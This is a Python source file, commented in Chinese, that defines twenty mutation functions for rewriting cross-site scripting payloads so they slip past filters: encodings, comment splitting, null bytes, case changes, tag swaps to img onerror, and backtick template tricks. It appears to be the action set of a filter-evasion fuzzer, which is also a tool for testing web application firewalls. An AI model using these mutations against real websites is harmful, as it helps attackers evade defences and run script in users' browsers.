import random
import urllib.parse

# 定義20個XSS變異策略函式
def action_unicode_encode(payload):
    """a0: 將關鍵彈窗函數關鍵字用Unicode轉義表示（如 alert -> \\u0061\\u006c...）"""
    # 將 'alert', 'prompt', 'confirm' 等字串中的字母轉換為 \\uXXXX 格式
    targets = ["alert", "prompt", "confirm"]
    result = payload
    for t in targets:
        if t in result:
            encoded = "".join(["\\u{:04x}".format(ord(c)) for c in t])
            result = result.replace(t, encoded)
    return result

def action_html_entity(payload):
    """a1: 將關鍵字或符號替換為HTML實體（如 < -> &lt;, ' -> &#39; 等）"""
    replacements = {
        "<": "&lt;", ">": "&gt;", "&": "&amp;",
        "\"": "&quot;", "'": "&#39;"
    }
    result = "".join(replacements.get(ch, ch) for ch in payload)
    return result

def action_url_encode(payload):
    """a2: 將整個字串進行URL編碼（百分號編碼）"""
    return urllib.parse.quote(payload)  # 將特殊字元轉為%XX形式

def action_double_url_encode(payload):
    """a3: 雙重URL編碼"""
    once = urllib.parse.quote(payload)
    return urllib.parse.quote(once)

def action_to_lower(payload):
    """a4: 將字串中英文字母全部轉小寫"""
    return payload.lower()

def action_to_upper(payload):
    """a5: 將字串中英文字母全部轉大寫"""
    return payload.upper()

def action_insert_whitespace(payload):
    """a6: 在關鍵位置插入空白或換行等空白字元（如在 < 和 javascript 之間等）"""
    # 在 'javascript:' 後插入空白，或在 'alert' 前後插入空格作為繞過
    result = payload
    result = result.replace("javascript:", "javascript: ")
    result = result.replace("alert", "alert ")
    return result

def action_insert_comment(payload):
    """a7: 插入HTML註解斷開關鍵字（如 al<!-- -->ert）"""
    result = payload
    # 在 "alert" 中插入註解
    result = result.replace("alert", "al<!-- -->ert")
    # 在 "script" 中插入註解
    result = result.replace("script", "scr<!-- -->ipt")
    return result

def action_use_prompt(payload):
    """a8: 使用 prompt 替代 alert 函數"""
    return payload.replace("alert", "prompt")

def action_use_confirm(payload):
    """a9: 使用 confirm 替代 alert 函數"""
    return payload.replace("alert", "confirm")

def action_concat_string(payload):
    """a10: 將關鍵字拆分為字串拼接，例如 alert -> 'al' + 'ert'。"""
    result = payload
    if "alert" in result:
        result = result.replace("alert", "\"al\"+\"ert\"")
    return result

def action_use_window_alert(payload):
    """a11: 使用 window.alert 取代直接 alert 呼叫"""
    return payload.replace("alert", "window.alert")

def action_use_settimeout(payload):
    """a12: 使用 setTimeout 間接執行 alert（如 setTimeout('alert(1)',0)）"""
    result = payload
    if "alert" in result:
        # 如果已有 alert(...)，包裝進 setTimeout
        result = result.replace("alert", "setTimeout('alert")
        # 將尾部括號閉合並加參數 ,0)
        idx = result.find("setTimeout('alert")
        if idx != -1:
            # 在最後一個 ')' 前插入 "',0"
            last_paren = result.rfind(")")
            if last_paren != -1:
                result = result[:last_paren] + "',0)" + result[last_paren+1:]
    return result

def action_change_tag(payload):
    """a13: 更換攻擊向量使用的HTML標籤或事件載體，例如將<input onfocus>改為<img onerror>"""
    result = payload
    # 將 <input ... onfocus 改成 <img ... onerror
    if result.lower().startswith("<input"):
        result = "<img src=x " + result[len("<input "):]  # 用 img 開頭替換 input
        result = result.replace("onfocus", "onerror")
    # 將 <a href=javascript:... onerror> 改成 <img ...
    if result.lower().startswith("<a "):
        # 如果是 <a href=...,換成<img>或其它
        result = "<img src=x onerror=" + result[result.find("onerror=")+len("onerror="):]
    return result

def action_add_null(payload):
    """a14: 插入空字元（\\x00）繞過字串匹配"""
    # 在每個字符後插入空字元
    result = "".join(ch + "\x00" for ch in payload)
    return result

def action_escape_quotes(payload):
    """a15: 將引號轉義（如雙引號前加反斜線），或移除多餘引號"""
    result = payload.replace("\"", "\\\"").replace("'", "\\'")
    return result

def action_random_case(payload):
    """a16: 隨機變換字母大小寫"""
    result_chars = [
        ch.upper() if (ch.isalpha() and random.random() < 0.5) else ch.lower() if ch.isalpha() else ch 
        for ch in payload
    ]
    return "".join(result_chars)

def action_break_js_protocol(payload):
    """a17: 拆解 'javascript:' 協議字串，例如插入斜線或其他繞過字元"""
    result = payload
    result = result.replace("javascript:", "java" + "/" + "script:")
    return result

def action_insert_random_char(payload):
    """a18: 隨機插入一些無害字元（如逗號, 點號等）到字串中不同位置"""
    chars_to_insert = [",", ".", ";", "_"]
    result = list(payload)
    # 隨機挑若干位置插入
    for _ in range(min(3, len(payload))):
        idx = random.randrange(0, len(result)+1)
        result.insert(idx, random.choice(chars_to_insert))
    return "".join(result)

def action_use_backticks(payload):
    """a19: 使用反引號和模板字串 ${} 語法執行彈窗，繞過括號過濾"""
    result = payload
    # 找到 alert(1) 模式，替換為 `${alert(1)}` 並用反引號括住整個字串
    if "alert(" in result:
        # 去掉可能存在的 javascript: 前綴以避免影響
        result = result.replace("javascript:", "")
        # 將 onXXX="alert(1)" 替換為 onXXX=`${alert(1)}`
        result = result.replace("=\"alert", "=`${alert")
        result = result.replace(")\"", ")}`")
    return result

# 將所有動作函式按照索引存入列表，方便通過索引執行
ACTIONS = [
    action_unicode_encode,
    action_html_entity,
    action_url_encode,
    action_double_url_encode,
    action_to_lower,
    action_to_upper,
    action_insert_whitespace,
    action_insert_comment,
    action_use_prompt,
    action_use_confirm,
    action_concat_string,
    action_use_window_alert,
    action_use_settimeout,
    action_change_tag,
    action_add_null,
    action_escape_quotes,
    action_random_case,
    action_break_js_protocol,
    action_insert_random_char,
    action_use_backticks
]
